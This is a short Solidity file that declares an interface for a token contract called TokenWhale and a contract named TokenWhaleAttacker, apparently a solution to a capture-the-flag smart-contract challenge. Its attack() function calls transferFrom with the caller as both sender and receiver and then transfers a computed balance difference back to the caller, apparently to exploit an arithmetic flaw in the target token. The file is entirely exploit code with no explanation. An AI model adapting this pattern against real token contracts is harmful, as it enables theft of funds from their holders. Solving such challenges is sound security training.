// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenWhale {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external;

    function approve(address spender, uint256 value) external;

    function transfer(address to, uint256 value) external;

    function balanceOf(address owner) external view returns (uint256);
}

contract TokenWhaleAttacker {
    ITokenWhale target;

    constructor(address _targetAddress) {
        target = ITokenWhale(_targetAddress);
    }

    function attack() public {
        target.transferFrom(msg.sender, msg.sender, 10);
        uint256 bal = target.balanceOf(address(this));
        uint256 bal2 = target.balanceOf(msg.sender);
        target.transfer(msg.sender, bal - bal2);
    }
}
